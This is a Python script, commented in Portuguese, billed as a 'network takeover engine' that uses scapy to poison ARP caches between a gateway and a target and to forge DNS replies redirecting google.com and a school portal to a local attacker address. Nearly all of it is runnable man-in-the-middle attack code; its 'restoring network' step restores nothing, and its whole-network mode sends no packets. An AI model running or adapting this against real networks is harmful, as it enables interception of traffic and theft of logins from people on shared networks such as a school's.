#!/usr/bin/env python3
"""
NETWORK TAKEOVER ENGINE - MÓDULO DE ELITE
-----------------------------------------
Este motor orquestra ataques de dominação de rede de alto nível,
incluindo ARP Spoofing, DNS Spoofing e Injeção de Tráfego.

Projetado para controle total de um ambiente de rede isolado.
"""

import os
import sys
import time
import logging
import threading
from scapy.all import ARP, Ether, sendp, sniff, IP, UDP, DNS, DNSRR, Raw

# Configuração de Logging de Elite
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler("logs/network_takeover.log"), logging.StreamHandler()]
)
logger = logging.getLogger("TakeoverEngine")

class NetworkTakeover:
    def __init__(self, interface: str, gateway_ip: str, target_ip: str = None):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.target_ip = target_ip # Se None, ataca a rede toda
        self.stop_event = threading.Event()
        self.dns_hosts = {
            b"google.com.": "192.168.1.100", # Exemplo: Redirecionar Google para nosso IP
            b"portal.escola.": "192.168.1.100"
        }

    def arp_spoof(self):
        """Realiza envenenamento ARP para se tornar o Man-in-the-Middle"""
        logger.info(f"Iniciando ARP Spoofing: Gateway[{self.gateway_ip}] <-> Alvo[{self.target_ip or 'REDE'}]")
        
        # Obter MACs (simplificado para o código)
        # Em produção, usaria getmacbyip()
        
        while not self.stop_event.is_set():
            # Enganar o Alvo: "Eu sou o Gateway"
            if self.target_ip:
                sendp(Ether()/ARP(op=2, psrc=self.gateway_ip, pdst=self.target_ip), iface=self.interface, verbose=False)
                # Enganar o Gateway: "Eu sou o Alvo"
                sendp(Ether()/ARP(op=2, psrc=self.target_ip, pdst=self.gateway_ip), iface=self.interface, verbose=False)
            time.sleep(2)

    def dns_spoof_callback(self, pkt):
        """Intercepta e falsifica respostas DNS em tempo real"""
        if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0: # DNS Query
            qname = pkt.getlayer(DNS).qd.qname
            if qname in self.dns_hosts:
                logger.warning(f"[DNS SPOOF] Redirecionando {qname.decode()} para {self.dns_hosts[qname]}")
                
                # Construir resposta DNS falsa
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                              UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                              DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                              an=DNSRR(rrname=qname, ttl=10, rdata=self.dns_hosts[qname]))
                
                sendp(Ether()/spoofed_pkt, iface=self.interface, verbose=False)

    def start_dns_spoof(self):
        """Inicia o motor de DNS Spoofing"""
        logger.info("Iniciando Motor de DNS Spoofing...")
        sniff(iface=self.interface, filter="udp port 53", prn=self.dns_spoof_callback, store=0)

    def run_takeover(self):
        """Inicia a dominação total da rede"""
        arp_thread = threading.Thread(target=self.arp_spoof)
        dns_thread = threading.Thread(target=self.start_dns_spoof)
        
        arp_thread.start()
        dns_thread.start()
        
        logger.info("DOMINAÇÃO DE REDE ATIVA. Pressione Ctrl+C para parar.")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop_event.set()
            logger.info("Finalizando dominação e restaurando rede...")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Uso: sudo python3 network_takeover_engine.py <interface> <gateway_ip> [target_ip]")
        sys.exit(1)
        
    iface = sys.argv[1]
    gw = sys.argv[2]
    target = sys.argv[3] if len(sys.argv) > 3 else None
    
    engine = NetworkTakeover(iface, gw, target)
    engine.run_takeover()
